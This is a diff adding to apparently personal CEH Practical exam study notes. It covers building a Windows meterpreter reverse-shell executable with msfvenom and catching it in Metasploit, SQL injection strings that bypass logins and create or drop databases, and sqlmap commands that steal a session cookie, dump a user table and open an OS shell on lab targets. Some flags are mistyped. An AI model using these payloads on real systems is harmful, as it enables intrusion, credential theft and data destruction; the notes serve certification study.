@@ -128,3 +128,75 @@ Detail note: every domain: https://github.com/admarnelson/CEH-V11-Practical/blob
               Install the application in the android phone and you will get a session at metasploit
 
 
+Rest
+
+
+5. Windows exploitation
+
+                     Payload for windows exploitaion
+
+                     https://www.hackeracademy.org/how-to-hack-windows-10-with-fatrathack-windows-with-a-link/
+                     https://hakin9.org/windows-10-exploitation-with-just-one-image-by-anastasis-vasileiadis/
+                     https://medium.com/@leandro.almeida/hack-windows-10-with-metasploit-329c283db99a
+                     https://github.com/crazypiedrulce/CEH
+                     https://github.com/takke2607/CEH_Practical_Notes
+
+                     Open CMD and type this:
+
+                            1.msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST= LPORT=4444 -o /root/Desktop/Hack.exe
+                            2.After done close the cmd
+                            3.Refresh the desktop
+
+                            Open new CMD and type:
+
+                            1.msfconsole
+                            2.use exploit/multi/handler
+                            3.set payload windows/meterpreter/reverse_tcp
+                            4.set LHOST
+                            5.set LPORT 4444
+                            6.exploit
+
+6. SQL INJECTION
+
+
+	TCP port 1433			Target: Goodshopping
+
+       Login without valid credential (USERNAME: blah' or 1=1 -- password; empty)
+	create a account sql injection (USERNAME: blah';insert into login value ('john','apple123'); --  PASSWORD:empty) display must no mistake
+	create database USERNAME: blah';create database Mydatabase; --  PASSWORD:empty
+	delete database USERNAME: blah';drop database Mydatabase; --  PASSWORD:empty
+	
+	Extract database sqlmap 
+				Target: Moviescope 				pag 1447
+				login in webpage and inspect right-click
+	obtain session cookie (console type: document.cookie enter copy resulted cookie
+	enum_database, OS, web_App, web_SVR (root: sqlmap -u "http://moviescope.com/viewprofile.aspx?id=1"-- cookie= "result_cookie"--dbs ) then 2 times Yes
+	enum_tables (root: sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables ) then yes
+	enum_user_account (root: sqlmap -u "http://moviescope.com/viewprofile.aspx?id=1"-- cookie= "result_cookie"-D moviescope -T User_Login --Dump
+	enum_OS	(root: sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell ) then hostname or tasklist, help to see others commands
+	
+
+
+Complete till now .. now
+
+- Login a website
+- Inspect element
+- Dev tools-\&gt;Console: document.cookie
+- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; –dbs
+ - -u: Specify the target URL
+ - --cookie: Specify the HTTP cookie header value
+ - --dbs: Enumerate DBMS databases
+- Get a list of databases
+- Select a database to extract its tables
+- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –tables
+ - -D: Specify the DBMS database to enumerate
+ - --tables: Enumerate DBMS database tables
+- Get a list of tables
+- Select a column
+- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –T User\_Login --
+dump
+- Get table data of this column
+- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; --os-shell
+- Get the OS Shell
+- TASKLIST
+
